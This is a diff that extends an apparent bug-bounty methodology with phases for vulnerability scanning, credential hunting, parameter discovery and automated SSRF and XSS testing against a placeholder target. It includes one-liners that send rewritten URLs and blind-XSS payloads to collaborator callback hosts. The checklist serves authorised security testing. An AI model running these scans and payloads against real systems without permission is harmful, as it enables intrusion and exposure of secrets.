@@ -27,3 +27,42 @@ Tools:
 waybackurls
 gau
 katana
+ffuf -u https://target.com/FUZZ -w wordlist.txt -mc all
+
+✅ Phase 5: Vulnerability Scanning
+
+Tools:
+nuclei -l live_hosts.txt -t cves/ -o nuclei_cves.txt
+nuclei -l all_urls.txt -t vulnerabilities/ -o web_vulns.txt
+jaeles scan -s signatures/ -u https://target.com
+dalfox -b your.collaborator -w all_urls.txt
+
+✅ Phase 6: OSINT & Credential Hunting
+Find exposed secrets, APIs, or leaks from public sources.
+GitHub Dorking:
+  Tools: gitdorks, trufflehog, github-search
+
+LinkedIn:
+eagle-eye or hunter to find ex-employee
+
+✅ Phase 7: Parameter + JavaScript Analysis  (Uncover hidden params for IDOR, RCE, etc.)
+
+Tools:
+paramspider, arjun, kxss, bypass-admin
+JS file analysis:
+LinkFinder -i jsfile.js            (Look for: token=, auth=, redirect=, url=, id=, admin= )
+
+✅ Phase 8: SSRF, XSS, IDOR Automation
+
+SSRF :          waybackurls target.com | gf ssrf | qsreplace http://collab.yourdomain.com | while read url; do curl -s $url > /dev/null; done
+
+XSS  :          cat all_urls.txt | gf xss | dalfox pipe -b your.burpcollab.net
+
+IDOR :          Look for numeric IDs (user_id=, account=)
+                Try session swaps manually or with autorize plugin in Burp.
+
+
+
+
+
+
